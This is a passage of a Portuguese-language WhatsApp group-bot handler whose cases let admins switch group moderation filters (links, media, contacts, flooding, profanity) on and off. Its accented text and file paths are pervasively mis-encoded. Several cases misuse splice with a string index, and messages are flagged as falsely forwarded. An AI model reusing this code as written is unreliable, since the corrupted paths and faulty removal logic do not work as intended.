text: `‚ï≠‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚Ä¢ñßπ‚ùÄ‚Éò‡£≠‡£≠‡£≠‡£≠ŸúÍî∑‚Éî‡ªë‡£≠‡£≠Ÿúü©∏‚ùÄ‚Éò‡£≠‡£≠‡£≠‡£≠ŸúÍî∑‚Éî‡ªë‡£≠‡£≠Ÿúñßπ‚Ä¢‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚ïÆ\n ùóîùó®ùóßùó¢ ùó•ùóòùóîùóñùóß\n‚ï∞‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚Ä¢ñßπ‚ùÄ‚Éò‡£≠‡£≠‡£≠‡£≠ŸúÍî∑‚Éî‡ªë‡£≠‡£≠Ÿúü©∏‚ùÄ‚Éò‡£≠‡£≠‡£≠‡£≠ŸúÍî∑‚Éî‡ªë‡£≠‡£≠Ÿúñßπ‚Ä¢‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚ïØ`,
footer: `O auto react est√° ${isAutoReact ? 'ativado' : 'desativado'}\n`,
buttons: buttons02,
headerType: 4,
contextInfo:{forwardingScore:999, isForwarded:true}
}
pl.sendMessage(from, buttonMessage02, {quoted:selo})
}
break




//=================(ANTS)=================\\

case 'anticontatos':
case 'antictt':
case 'anticontato':
if (!isGroup) return reply(enviar.msg.grupo)
if (!isGroupAdmins) return reply(enviar.msg.adm)
if (!isBotGroupAdmins) return reply(enviar.msg.Badmin)
if (Number(args[0]) === 1) {
if (isAntiCtt) return reply('Ja esta ativo')
antictt.push(from)
fs.writeFileSync('./fun√ß√µes de cmd/antis/antictt.json', JSON.stringify(antictt))
reply('[ü©∏] Ativou com sucesso o recurso de anti contato neste grupo üìù')
} else if (Number(args[0]) === 0) {
if (!isAntiCtt) return reply('Ja esta Desativado')
pesquisar = from
processo = antictt.indexOf(pesquisar)
while(processo >= 0){
antictt.splice(processo, 1)
processo = antictt.indexOf(pesquisar)
}
fs.writeFileSync('./fun√ß√µes de cmd/antis/antictt.json', JSON.stringify(antictt))
reply('‚ÄºÔ∏è Desativou com sucesso o recurso de anti contato neste grupo‚úîÔ∏è')
} else {
if(isAntiCtt){
buttons02 = [
{buttonId: `${prefix + command} 0`, buttonText: {displayText: '[ü©∏] ùêÉùêÑùêíùêÄùêìùêàùêïùêÄùêë [ü©∏]'}, type: 1}
]
} else {
buttons02 = [
{buttonId: `${prefix + command} 1`, buttonText: {displayText: '[ü©∏] ùêÄùêìùêàùêïùêÄùêë [ü©∏]'}, type: 1}
]
}
buttonMessage02 = {
text: `
‚ï≠‚îÄ‚ïº‚îÅ‚ïê‚ïê‚îÅ‚îÅ‚â∫ü©∏‚âª‚îÅ‚îÅ‚ïê‚ïê‚îÅ‚ïæ‚îÄ‚ïÆ
    
             ùêÄùêçùêìùêà ùêÇùêéùêçùêìùêÄùêìùêé

   ùë∫ùíêùíçùíäùíÑùíäùíïùíêùíñ ùíê ùíÑùíêùíéùíÇùíèùíÖùíê: ${pushname}

   ùëÆùíìùíñùíëùíê: ${groupName}
‚ï∞‚îÄ‚ïº‚îÅ‚ïê‚ïê‚îÅ‚îÅ‚â∫ü©∏‚âª‚îÅ‚îÅ‚ïê‚ïê‚îÅ‚ïæ‚îÄ‚ïØ      `,
footer: `O anti Contato est√° ${isAntiCtt ? 'ativado' : 'desativado'}\n`,
buttons: buttons02,
headerType: 4,
contextInfo:{forwardingScore:999, isForwarded:true}
}
pl.sendMessage(from, buttonMessage02, {quoted:selo})
}
break

case 'anticatalogo':
case 'anticatalg':  
if (!isGroup) return reply(enviar.msg.grupo)
if (!isGroupAdmins) return reply(enviar.msg.adm)
if (!isBotGroupAdmins) return reply(enviar.msg.Badmin)
if (Number(args[0]) === 1) {
if (isAnticatalogo) return reply('Ja esta ativo')
anticatalogo.push(from)
fs.writeFileSync('./fun√ß√µes de cmd/antis/anticatalogo.json', JSON.stringify(anticatalogo))
reply('[ü©∏] Ativou com sucesso o recurso de anticatalogo neste grupo üìù')
} else if (Number(args[0]) === 0) {
if (!isAnticatalogo) return reply('Ja esta Desativado')
pesquisar = from
processo = anticatalogo.indexOf(pesquisar)
while(processo >= 0){
anticatalogo.splice(processo, 1)
processo = anticatalogo.indexOf(pesquisar)
}
fs.writeFileSync('./fun√ß√µes de cmd/antis/anticatalogo.json', JSON.stringify(anticatalogo))
reply('‚ÄºÔ∏è Desativou com sucesso o recurso de anticatalogo neste grupo‚úîÔ∏è')
} else {
if(isAnticatalogo){
buttons02 = [
{buttonId: `${prefix + command} 0`, buttonText: {displayText: '[ü©∏] ùêÉùêÑùêíùêÄùêìùêàùêïùêÄùêë [ü©∏]'}, type: 1}
]
} else {
buttons02 = [
{buttonId: `${prefix + command} 1`, buttonText: {displayText: '[ü©∏] ùêÄùêìùêàùêïùêÄùêë [ü©∏]'}, type: 1}
]
}
buttonMessage02 = {
text: `
‚ï≠‚îÄ‚ïº‚îÅ‚ïê‚ïê‚îÅ‚îÅ‚â∫ü©∏‚âª‚îÅ‚îÅ‚ïê‚ïê‚îÅ‚ïæ‚îÄ‚ïÆ
    
            ùêÄùêçùêìùêà ùêÇùêÄùêìùêÄùêãùêéùêÜùêé

   ùë∫ùíêùíçùíäùíÑùíäùíïùíêùíñ ùíê ùíÑùíêùíéùíÇùíèùíÖùíê: ${pushname}

   ùëÆùíìùíñùíëùíê: ${groupName}
‚ï∞‚îÄ‚ïº‚îÅ‚ïê‚ïê‚îÅ‚îÅ‚â∫ü©∏‚âª‚îÅ‚îÅ‚ïê‚ïê‚îÅ‚ïæ‚îÄ‚ïØ`,
footer: `O anti cat√°logo est√° ${isAnticatalogo ? 'ativado' : 'desativado'}\n`,
buttons: buttons02,
headerType: 4,
contextInfo:{forwardingScore:999, isForwarded:true}
}
pl.sendMessage(from, buttonMessage02, {quoted:selo})
}
break

case 'botoff':
case 'boton':
if (!isGroup) return reply(enviar.msg.grupo)
if(!SoDono) return reply("S√≥ dono pode executar esta a√ß√£o...")
if (args.length < 1) return reply('1 pra ligar / 0 pra desligar')
if (Number(args[0]) === 1) {
if (botoff.includes(from)) return reply('Ja esta ativo')
botoff.push(from)
fs.writeFileSync('./fun√ß√µes de cmd/grupos/botoff.json', JSON.stringify(botoff))
reply('Desativando fun√ß√µes e parando a execu√ß√£o de comandos por membros com sucesso...')
} else if (Number(args[0]) === 0) {
if (!botoff.includes(from)) return reply('Ja esta Desativado')
pesquisar = from
processo = botoff.indexOf(pesquisar)
while(processo >= 0){
botoff.splice(processo, 1)
processo = botoff.indexOf(pesquisar)
}
fs.writeFileSync('./fun√ß√µes de cmd/grupos/botoff.json', JSON.stringify(botoff))
reply(`Ativando todos os funcionamentos do bot novamente...`)
} else {
reply('1 para ativar, 0 para desativar')
}
break

case 'antifake':
                if (!m.isGroup) return m.reply('S√≥ em Grupo')
                if (!isGroupAdmins) return m.reply('Voc√™ N√£o √© Adm')
                if (!isBotGroupAdmins) return m.reply('o bot precisa ser adm')
                buttonsi = [
                    { buttonId: `${prefix}varfake 0`, buttonText: { displayText: 'üîë DESATIVAR' }, type: 1 },
                    { buttonId: `${prefix}varfake 1`, buttonText: { displayText: 'üîí ATIVAR' }, type: 1 }
                ]

                buttonMessageiu = {
                    text: `Atualmente o Antifake Est√° ${isAntifake ? 'Ativo' : 'Desativado'}`,
                    footer: `B·•°: ${NomeDoBot}`,
                    buttons: buttonsi,
                    headerType: 1
                }

                await pl.sendMessage(m.chat, buttonMessageiu, { quoted: selo })

                break

            case 'varfake':
                if (!m.isGroup) return m.reply('S√≥ em Grupo')
                if (!isGroupAdmins) return m.reply('Voc√™ N√£o √© Adm')
                if (!isBotGroupAdmins) return m.reply('o bot precisa ser adm')
                if (args.length < 1) return m.reply('Ative pressione 1, Desativar pressione 0')
                if (Number(args[0]) === 1) {
                    if (isAntifake) return m.reply(`O recurso de  Anti fake j√° est√° Ativado neste grupo: ${groupName}`)
                    if (isAntifake) return m.reply('*O recurso de Anti fake j√° estava ativo antes*')
                    antifake.push(m.chat)
                    fs.writeFileSync('./fun√ß√µes de cmd/antis/antifake.json', JSON.stringify(antifake))
                    reply(`Antifake foi ativado com sucesso neste grupo - : ${groupName}`)
                } else if (Number(args[0]) === 0) {
                    if (!isAntifake) return reply(`O recurso de  Anti fake j√° est√° Desativado neste grupo.`)
                    antifake.splice(m.chat, 1)
                    fs.writeFileSync('./fun√ß√µes de cmd/antis/antifake.json', JSON.stringify(antifake))
                    reply(`Antifake foi Desativado com sucesso neste grupo - : ${groupName}`)
                } else {
                    reply('„Äå* Adicionar par√¢metro 1 ou 0 ')
                }
                break

case 'antiloc':
if (!isGroup) return reply(enviar.msg.grupo)
if (!isGroupAdmins) return reply(enviar.msg.adm)
if (!isBotGroupAdmins) return reply(enviar.msg.Badmin)
if (Number(args[0]) === 1) {
if (Antiloc) return reply('Ja esta ativo')
antiloc.push(from)
fs.writeFileSync('./fun√ß√µes de cmd/antis/antiloc.json', JSON.stringify(antiloc))
reply('üåÄ Ativou com sucesso o recurso de anti Localiza√ß√£o neste grupo üìù')
} else if (Number(args[0]) === 0) {
if (!Antiloc) return reply('Ja esta Desativado')
pesquisar = from
processo = antiloc.indexOf(pesquisar)
while(processo >= 0){
antiloc.splice(processo, 1)
processo = antiloc.indexOf(pesquisar)
}
fs.writeFileSync('./fun√ß√µes de cmd/antis/antiloc.json', JSON.stringify(antiloc))
reply('‚ÄºÔ∏è Desativou com sucesso o recurso de anti Localiza√ß√£o neste grupo‚úîÔ∏è')
} else {
if(Antiloc){
buttons02 = [
{buttonId: `${prefix + command} 0`, buttonText: {displayText: '[ü©∏] ùêÉùêÑùêíùêÄùêìùêàùêïùêÄùêë [ü©∏]'}, type: 1}
]
} else {
buttons02 = [
{buttonId: `${prefix + command} 1`, buttonText: {displayText: '[ü©∏] ùêÄùêìùêàùêïùêÄùêë [ü©∏]'}, type: 1}
]
}
buttonMessage02 = {
text: `
‚ï≠‚îÄ‚ïº‚îÅ‚ïê‚ïê‚îÅ‚îÅ‚â∫ü©∏‚âª‚îÅ‚îÅ‚ïê‚ïê‚îÅ‚ïæ‚îÄ‚ïÆ
    
                 ùêÄùêçùêìùêà ùêãùêéùêÇ

   ùë∫ùíêùíçùíäùíÑùíäùíïùíêùíñ ùíê ùíÑùíêùíéùíÇùíèùíÖùíê: ${pushname}

   ùëÆùíìùíñùíëùíê: ${groupName}
‚ï∞‚îÄ‚ïº‚îÅ‚ïê‚ïê‚îÅ‚îÅ‚â∫ü©∏‚âª‚îÅ‚îÅ‚ïê‚ïê‚îÅ‚ïæ‚îÄ‚ïØ      
`,
footer: `O anti Localiza√ß√£o est√° ${Antiloc ? 'ativado' : 'desativado'}\n`,
buttons: buttons02,
headerType: 4,
contextInfo:{forwardingScore:999, isForwarded:true}
}
pl.sendMessage(from, buttonMessage02, {quoted:selo})
}
break

case 'antidocumento':
case 'antidoc':
if (!isGroup) return reply(enviar.msg.grupo)
if (!isGroupAdmins) return reply(enviar.msg.adm)
if (!isBotGroupAdmins) return reply(enviar.msg.Badmin)
if (Number(args[0]) === 1) {
if (Antidoc) return reply('Ja esta ativo')
antidoc.push(from)
fs.writeFileSync('./fun√ß√µes de cmd/antis/antidoc.json', JSON.stringify(antidoc))
reply('üåÄ Ativou com sucesso o recurso de anti documento neste grupo üìù')
} else if (Number(args[0]) === 0) {
if (!Antidoc) return reply('Ja esta Desativado')
pesquisar = from
processo = antidoc.indexOf(pesquisar)
while(processo >= 0){
antidoc.splice(processo, 1)
processo = antidoc.indexOf(pesquisar)
}
fs.writeFileSync('./fun√ß√µes de cmd/antis/antidoc.json', JSON.stringify(antidoc))
reply('‚ÄºÔ∏è Desativou com sucesso o recurso de anti documento neste grupo‚úîÔ∏è')
} else {
if(Antidoc){
buttons02 = [
{buttonId: `${prefix + command} 0`, buttonText: {displayText: '[ü©∏] ùêÉùêÑùêíùêÄùêìùêàùêïùêÄùêë [ü©∏]'}, type: 1}
]
} else {
buttons02 = [
{buttonId: `${prefix + command} 1`, buttonText: {displayText: '[ü©∏] ùêÄùêìùêàùêïùêÄùêë [ü©∏]'}, type: 1}
]
}
buttonMessage02 = {
text: `
‚ï≠‚îÄ‚ïº‚îÅ‚ïê‚ïê‚îÅ‚îÅ‚â∫ü©∏‚âª‚îÅ‚îÅ‚ïê‚ïê‚îÅ‚ïæ‚îÄ‚ïÆ
    
                 ùêÄùêçùêìùêà ùêÉùêéùêÇùêîùêåùêÑùêçùêìùêé

   ùë∫ùíêùíçùíäùíÑùíäùíïùíêùíñ ùíê ùíÑùíêùíéùíÇùíèùíÖùíê: ${pushname}

   ùëÆùíìùíñùíëùíê: ${groupName}
‚ï∞‚îÄ‚ïº‚îÅ‚ïê‚ïê‚îÅ‚îÅ‚â∫ü©∏‚âª‚îÅ‚îÅ‚ïê‚ïê‚îÅ‚ïæ‚îÄ‚ïØ      
`,
footer: `O anti documentos est√° ${Antidoc ? 'ativado' : 'desativado'}\n`,
buttons: buttons02,
headerType: 4,
contextInfo:{forwardingScore:999, isForwarded:true}
}
pl.sendMessage(from, buttonMessage02, {quoted:selo})
}
break

case 'antiimg':
if (!isGroup) return reply(enviar.msg.grupo)
if (!isGroupAdmins) return reply(enviar.msg.adm)
if (!isBotGroupAdmins) return reply(enviar.msg.Badmin)
if (Number(args[0]) === 1) {
if (isAntiImg) return reply('J√° Esta ativo')
antiimg.push(from)
fs.writeFileSync('./fun√ß√µes de cmd/antis/antiimg.json', JSON.stringify(antiimg))
reply('Ativou com sucesso o recurso de anti imagem neste grupo‚úîÔ∏è')
} else if (Number(args[0]) === 0) {
if (!isAntiImg) return reply('Ja esta Desativado.')
antiimg.splice(from, 1)
fs.writeFileSync('./fun√ß√µes de cmd/antis/antiimg.json', JSON.stringify(antiimg))
reply('Desativou com sucesso o recurso de anti imagem neste grupo‚úîÔ∏è')
} else {
if(isAntiImg){
buttons02 = [
{buttonId: `${prefix + command} 0`, buttonText: {displayText: '[ü©∏] ùêÉùêÑùêíùêÄùêìùêàùêïùêÄùêë [ü©∏]'}, type: 1}
]
} else {
buttons02 = [
{buttonId: `${prefix + command} 1`, buttonText: {displayText: '[ü©∏] ùêÄùêìùêàùêïùêÄùêë [ü©∏]'}, type: 1}
]
}
buttonMessage02 = {
text: `
‚ï≠‚îÄ‚ïº‚îÅ‚ïê‚ïê‚îÅ‚îÅ‚â∫ü©∏‚âª‚îÅ‚îÅ‚ïê‚ïê‚îÅ‚ïæ‚îÄ‚ïÆ
    
                 ùêÄùêçùêìùêà ùêàùêåùêÜ

   ùë∫ùíêùíçùíäùíÑùíäùíïùíêùíñ ùíê ùíÑùíêùíéùíÇùíèùíÖùíê: ${pushname}

   ùëÆùíìùíñùíëùíê: ${groupName}
‚ï∞‚îÄ‚ïº‚îÅ‚ïê‚ïê‚îÅ‚îÅ‚â∫ü©∏‚âª‚îÅ‚îÅ‚ïê‚ïê‚îÅ‚ïæ‚îÄ‚ïØ      
`,
footer: `O anti Imagem est√° ${isAntiImg ? 'ativado' : 'desativado'}\n`,
buttons: buttons02,
headerType: 4,
contextInfo:{forwardingScore:999, isForwarded:true}
}
pl.sendMessage(from, buttonMessage02, {quoted:selo})
}
break

case 'antisticker':
if (!isGroup) return reply(enviar.msg.grupo)
if (!isGroupAdmins) return reply(enviar.msg.adm)
if (!isBotGroupAdmins) return reply(enviar.msg.Badmin)
if (Number(args[0]) === 1) {
if (isAntiSticker) return reply('J√° Esta ativo')
antisticker.push(from)
fs.writeFileSync('./fun√ß√µes de cmd/antis/antisticker.json', JSON.stringify(antisticker))
reply('Ativou com sucesso o recurso de anti sticker neste grupo‚úîÔ∏è')
} else if (Number(args[0]) === 0) {
if (!isAntiSticker) return reply('Ja esta Desativado.')
antisticker.splice(from, 1)
fs.writeFileSync('./fun√ß√µes de cmd/antis/antisticker.json', JSON.stringify(antisticker))
reply('Desativou com sucesso o recurso de anti sticker neste grupo‚úîÔ∏è')
} else {
if(isAntiSticker){
buttons02 = [
{buttonId: `${prefix + command} 0`, buttonText: {displayText: '[ü©∏] ùêÉùêÑùêíùêÄùêìùêàùêïùêÄùêë [ü©∏]'}, type: 1}
]
} else {
buttons02 = [
{buttonId: `${prefix + command} 1`, buttonText: {displayText: '[ü©∏] ùêÄùêìùêàùêïùêÄùêë [ü©∏]'}, type: 1}
]
}
buttonMessage02 = {
text: `
‚ï≠‚îÄ‚ïº‚îÅ‚ïê‚ïê‚îÅ‚îÅ‚â∫ü©∏‚âª‚îÅ‚îÅ‚ïê‚ïê‚îÅ‚ïæ‚îÄ‚ïÆ
    
                 ùêÄùêçùêìùêà ùêíùêìùêàùêÇùêäùêÑùêë

   ùë∫ùíêùíçùíäùíÑùíäùíïùíêùíñ ùíê ùíÑùíêùíéùíÇùíèùíÖùíê: ${pushname}

   ùëÆùíìùíñùíëùíê: ${groupName}
‚ï∞‚îÄ‚ïº‚îÅ‚ïê‚ïê‚îÅ‚îÅ‚â∫ü©∏‚âª‚îÅ‚îÅ‚ïê‚ïê‚îÅ‚ïæ‚îÄ‚ïØ      
`,
footer: `O anti sticker/figurinha est√° ${isAntiSticker ? 'ativado' : 'desativado'}\n`,
buttons: buttons02,
headerType: 4,
contextInfo:{forwardingScore:999, isForwarded:true}
}
pl.sendMessage(from, buttonMessage02, {quoted:selo})
}
break

case 'antinotas':
if (!isGroup) return reply(enviar.msg.grupo)
if (!isGroupAdmins) return reply(enviar.msg.adm)
if (!isBotGroupAdmins) return reply(enviar.msg.Badmin)
if (Number(args[0]) === 1) {
if (isAntiNotas) return reply('J√° Esta ativo')
antinotas.push(from)
fs.writeFileSync('./fun√ß√µes de cmd/antis/antinotas.json', JSON.stringify(antinotas))
reply('Ativou com sucesso o recurso de anti notas neste grupo‚úîÔ∏è')
} else if (Number(args[0]) === 0) {
if (!isAntiNotas) return reply('Ja esta Desativado.')
antinotas.splice(from, 1)
fs.writeFileSync('./fun√ß√µes de cmd/antis/antinotas.json', JSON.stringify(antinotas))
reply('Desativou com sucesso o recurso de anti notas neste grupo‚úîÔ∏è')
} else {
if(isAntiNotas){
buttons02 = [
{buttonId: `${prefix + command} 0`, buttonText: {displayText: '[ü©∏] ùêÉùêÑùêíùêÄùêìùêàùêïùêÄùêë [ü©∏]'}, type: 1}
]
} else {
buttons02 = [
{buttonId: `${prefix + command} 1`, buttonText: {displayText: '[ü©∏] ùêÄùêìùêàùêïùêÄùêë [ü©∏]'}, type: 1}
]
}
buttonMessage02 = {
text: `
‚ï≠‚îÄ‚ïº‚îÅ‚ïê‚ïê‚îÅ‚îÅ‚â∫ü©∏‚âª‚îÅ‚îÅ‚ïê‚ïê‚îÅ‚ïæ‚îÄ‚ïÆ
    
                 ùêÄùêçùêìùêà ùêçùêéùêìùêÄùêí

   ùë∫ùíêùíçùíäùíÑùíäùíïùíêùíñ ùíê ùíÑùíêùíéùíÇùíèùíÖùíê: ${pushname}

   ùëÆùíìùíñùíëùíê: ${groupName}
‚ï∞‚îÄ‚ïº‚îÅ‚ïê‚ïê‚îÅ‚îÅ‚â∫ü©∏‚âª‚îÅ‚îÅ‚ïê‚ïê‚îÅ‚ïæ‚îÄ‚ïØ      
`,
footer: `O anti nota est√° ${isAntiNotas ? 'ativado' : 'desativado'}\n`,
buttons: buttons02,
headerType: 4,
contextInfo:{forwardingScore:999, isForwarded:true}
}
pl.sendMessage(from, buttonMessage02, {quoted:selo})
}
break

case 'antivideo':
if (!isGroup) return reply(enviar.msg.grupo)
if (!isGroupAdmins) return reply(enviar.msg.adm)
if (!isBotGroupAdmins) return reply(enviar.msg.Badmin)
if (Number(args[0]) === 1) {
if (isAntiVid) return reply('Ja esta ativo')
antivid.push(from)
fs.writeFileSync('./fun√ß√µes de cmd/antis/antivideo.json', JSON.stringify(antivid))
reply('Ativou com sucesso o recurso de anti video neste grupo‚úîÔ∏è')
} else if (Number(args[0]) === 0) {
if (!isAntiVid) return reply('Ja esta Desativado')
antivid.splice(from, 1)
fs.writeFileSync('./fun√ß√µes de cmd/antis/antivideo.json', JSON.stringify(antivid))
reply('Desativou com sucesso o recurso de anti video neste grupo‚úîÔ∏è')
} else {
if(isAntiVid){
buttons02 = [
{buttonId: `${prefix + command} 0`, buttonText: {displayText: '[ü©∏] ùêÉùêÑùêíùêÄùêìùêàùêïùêÄùêë [ü©∏]'}, type: 1}
]
} else {
buttons02 = [
{buttonId: `${prefix + command} 1`, buttonText: {displayText: '[ü©∏] ùêÄùêìùêàùêïùêÄùêë [ü©∏]'}, type: 1}
]
}
buttonMessage02 = {
text: `
‚ï≠‚îÄ‚ïº‚îÅ‚ïê‚ïê‚îÅ‚îÅ‚â∫ü©∏‚âª‚îÅ‚îÅ‚ïê‚ïê‚îÅ‚ïæ‚îÄ‚ïÆ
    
                 ùêÄùêçùêìùêà ùêïùêàùêÉùêÑùêé 

   ùë∫ùíêùíçùíäùíÑùíäùíïùíêùíñ ùíê ùíÑùíêùíéùíÇùíèùíÖùíê: ${pushname}

   ùëÆùíìùíñùíëùíê: ${groupName}
‚ï∞‚îÄ‚ïº‚îÅ‚ïê‚ïê‚îÅ‚îÅ‚â∫ü©∏‚âª‚îÅ‚îÅ‚ïê‚ïê‚îÅ‚ïæ‚îÄ‚ïØ      
`,
footer: `O anti video est√° ${isAntiVid ? 'ativado' : 'desativado'}\n`,
buttons: buttons02,
headerType: 4,
contextInfo:{forwardingScore:999, isForwarded:true}
}
pl.sendMessage(from, buttonMessage02, {quoted:selo})
}
break

case 'limitecaracteres':
case 'limiteflood':  
case 'antiflood':
if (!isGroup) return reply(enviar.msg.adm)
if (!isGroupAdmins) return reply(enviar.msg.adm)
if (!isBotGroupAdmins) return reply(enviar.msg.Badmin)
if (Number(args[0]) === 1) {
if (isAntiFlood) return reply(`üåÄ O recurso limite de caracteres at√© ${limitefl} j√° est√° ativo no grupo üåÄ`)
antiflood.push(from)
fs.writeFileSync('./fun√ß√µes de cmd/usuarios/antiflood.json', JSON.stringify(antiflood))
reply(`‚úîÔ∏è O recurso limite de caracteres ${limitefl} foi ativado nesse grupoüìù`)
} else if (Number(args[0]) === 0) {
 if (!isAntiFlood) return reply('‚úîÔ∏è O recurso limite de caracteres n√£o est√° ativado no grupo üìù')
let position = false
Object.keys(antiflood).forEach((i) => {
if (antiflood[i] === from) {
position = i
}
})
if (position !== false) {
antiflood.splice(position, 1)
fs.writeFileSync('./fun√ß√µes de cmd/usuarios/antiflood.json', JSON.stringify(antiflood))
}
reply('O recurso limite de caracteres foi desativado nesse grupo ‚úîÔ∏è')
} else {
if(isAntiFlood){
buttons02 = [
{buttonId: `${prefix + command} 0`, buttonText: {displayText: '[ü©∏] ùêÉùêÑùêíùêÄùêìùêàùêïùêÄùêë [ü©∏]'}, type: 1}
]
} else {
buttons02 = [
{buttonId: `${prefix + command} 1`, buttonText: {displayText: '[ü©∏] ùêÄùêìùêàùêïùêÄùêë [ü©∏]'}, type: 1}
]
}
buttonMessage02 = {
text: `
‚ï≠‚îÄ‚ïº‚îÅ‚ïê‚ïê‚îÅ‚îÅ‚â∫ü©∏‚âª‚îÅ‚îÅ‚ïê‚ïê‚îÅ‚ïæ‚îÄ‚ïÆ
    
                 ùêÄùêçùêìùêà ùêÖùêãùêéùêéùêÉ

   ùë∫ùíêùíçùíäùíÑùíäùíïùíêùíñ ùíê ùíÑùíêùíéùíÇùíèùíÖùíê: ${pushname}

   ùëÆùíìùíñùíëùíê: ${groupName}
‚ï∞‚îÄ‚ïº‚îÅ‚ïê‚ïê‚îÅ‚îÅ‚â∫ü©∏‚âª‚îÅ‚îÅ‚ïê‚ïê‚îÅ‚ïæ‚îÄ‚ïØ      
`,
footer: `O anti flood est√° ${isAntiFlood ? 'ativado' : 'desativado'}\n`,
buttons: buttons02,
headerType: 4,
contextInfo:{forwardingScore:999, isForwarded:true}
}
pl.sendMessage(from, buttonMessage02, {quoted:selo})
}
break

case 'resetarttt':
case 'rvttt':  
if (!isGroup) return reply(enviar.msg.grupo)
if (!isGroupAdmins) return reply(enviar.msg.adm)
if (!isBotGroupAdmins) return reply(enviar.msg.Badmin)
daily.splice([])
fs.writeFileSync('./fun√ß√µes de cmd/usuarios/diario.json', JSON.stringify(daily))
reply('‚ÄºÔ∏èO jogo da velha TTT foi resetado com sucesso..‚úîÔ∏è')
reply(`${prefix}reiniciar`)
break

case 'antipalavr√£o':
case 'antipalavrao':  
case 'antipalavra':    
if (!isGroup) return reply(`[‚ùó] SOMENTE EM GRUPOS`)
if (!isGroupAdmins) return reply(`[‚ùó] O PRECISA SER ADMIN`)
if (!isBotGroupAdmins) return reply(`[‚ùó] O BOT PRECISA SER ADMIN`)
if (args.length < 1) return reply(`[‚ùó] 1 / 0, Exemplo ${prefix + command} 1`)
if (Number(args[0]) === 1) {
if (isPalavrao) return reply('Ja esta ativo.')
palavrao.push(from)
fs.writeFileSync('./fun√ß√µes de cmd/grupos/palavrao.json', JSON.stringify(palavrao))
reply('üåÄ Ativou com sucesso o recurso de Anti Palavras hardcore neste grupo üìù')
} else if (Number(args[0]) === 0) {
if (!isPalavrao) return reply('Ja esta Desativado')
pesquisar = from
processo = palavrao.indexOf(pesquisar)
while(processo >= 0){
palavrao.splice(processo, 1)
processo = palavrao.indexOf(pesquisar)
}
fs.writeFileSync('./fun√ß√µes de cmd/grupos/palavrao.json', JSON.stringify(palavrao))
reply('‚ÄºÔ∏è Desativou com sucesso o recurso de Anti Palavra harcore neste grupo‚úîÔ∏è')
} else {
reply('1 para ativar, 0 para desativar')
}
break

case 'antilinkhard':
case 'antilink':
if (!isGroup) return reply(enviar.msg.grupo)
if (!isGroupAdmins) return reply(enviar.msg.adm)
if (!isBotGroupAdmins) return reply(enviar.msg.Badmin)
if (Number(args[0]) === 1) {
if (isAntiLinkHard) return reply('Ja esta ativo')
antilinkhard.push(from)
fs.writeFileSync('./fun√ß√µes de cmd/antis/antilinkhard.json', JSON.stringify(antilinkhard))
reply('[‚ö°Ô∏è] Ativou com sucesso o recurso de antilink hardcore neste grupo.')
} else if (Number(args[0]) === 0) {
if (!isAntiLinkHard) return reply('Ja esta Desativado')
pesquisar = from
processo = antilinkhard.indexOf(pesquisar)
while(processo >= 0){
antilinkhard.splice(processo, 1)
processo = antilinkhard.indexOf(pesquisar)
}
fs.writeFileSync('./fun√ß√µes de cmd/antis/antilinkhard.json', JSON.stringify(antilinkhard))
reply('„Äé‚ùó„ÄèDesativou com sucesso o recurso de antilink harcore neste grupo.')
} else {
if(isAntiLinkHard){
buttons02 = [{buttonId: `${prefix + command} 0`, buttonText: {displayText: 'Desativar ‚úò'}, type: 1}]
} else {
buttons02 = [{buttonId: `${prefix + command} 1`, buttonText: {displayText: 'Ativar ‚úì'}, type: 1}]
}
buttonMessage02 = {
text: `[üåπ] ùêÄùêçùêìùêà-ùêãùêàùêçùêä ùêáùêÄùêëùêÉ [üåπ]`,
footer: `O anti link est√° ${isAntiLinkHard ? 'ativado' : 'desativado'}\n`,
buttons: buttons02,
headerType: 4,
contextInfo:{forwardingScore:999, isForwarded:true}
}
pl.sendMessage(from, buttonMessage02, {quoted: selo})
}
break

case 'antilinkgp':
if (!isGroup) return reply(enviar.msg.grupo)
if (!isGroupAdmins) return reply(enviar.msg.adm)
if (!isBotGroupAdmins) return reply(enviar.msg.Badmin)
if (Number(args[0]) === 1) {
if (isAntilinkgp) return reply('Ja esta ativo')
antilinkgp.push(from)
fs.writeFileSync('./fun√ß√µes de cmd/antis/antilinkgp.json', JSON.stringify(antilinkgp))
reply('[ü©∏] Ativou com sucesso o recurso de antilinkgp üìù')
} else if (Number(args[0]) === 0) {
if (!isAntilinkgp) return reply('Ja esta Desativado')
pesquisar = from
processo = antilinkgp.indexOf(pesquisar)
while(processo >= 0){
antilinkgp.splice(processo, 1)
processo = antilinkgp.indexOf(pesquisar)
}
fs.writeFileSync('./fun√ß√µes de cmd/antis/antilinkgp.json', JSON.stringify(antilinkgp))
reply('‚ÄºÔ∏è Desativou com sucesso o recurso de antilink de grupo ‚úîÔ∏è')
} else {
if(isAntilinkgp){
buttons02 = [
{buttonId: `${prefix + command} 0`, buttonText: {displayText: '[ü©∏] ùêÉùêÑùêíùêÄùêìùêàùêïùêÄùêë [ü©∏]'}, type: 1}
]
} else {
buttons02 = [
{buttonId: `${prefix + command} 1`, buttonText: {displayText: '[ü©∏] ùêÄùêìùêàùêïùêÄùêë [ü©∏]'}, type: 1},
]
}
buttonMessage02 = {
text: `
‚ï≠‚îÄ‚ïº‚îÅ‚ïê‚ïê‚îÅ‚îÅ‚â∫ü©∏‚âª‚îÅ‚îÅ‚ïê‚ïê‚îÅ‚ïæ‚îÄ‚ïÆ
    
      ùêÄùêçùêìùêà ùêãùêàùêçùêä ùêÉùêÑ ùêÜùêëùêîùêèùêé

   ùë∫ùíêùíçùíäùíÑùíäùíïùíêùíñ ùíê ùíÑùíêùíéùíÇùíèùíÖùíê: ${pushname}

   ùëÆùíìùíñùíëùíê: ${groupName}
‚ï∞‚îÄ‚ïº‚îÅ‚ïê‚ïê‚îÅ‚îÅ‚â∫ü©∏‚âª‚îÅ‚îÅ‚ïê‚ïê‚îÅ‚ïæ‚îÄ‚ïØ
`,
footer: `O anti link grupo est√° ${isAntilinkgp ? 'ativado' : 'desativado'}\n`,
buttons: buttons02,
headerType: 4,
contextInfo:{forwardingScore:999, isForwarded:true}
}
pl.sendMessage(from, buttonMessage02, {quoted:selo})
}
break


case 'bemvindo33':
if (!isGroup) return reply(enviar.msg.grupo)
if (!isGroupAdmins) return reply(enviar.msg.adm)
if (!isBotGroupAdmins) return reply(enviar.msg.Badmin)
if (Number(args[0]) === 1) {
if (isWelkom3) return reply('Ja esta ativo')
welkom3.push(from)
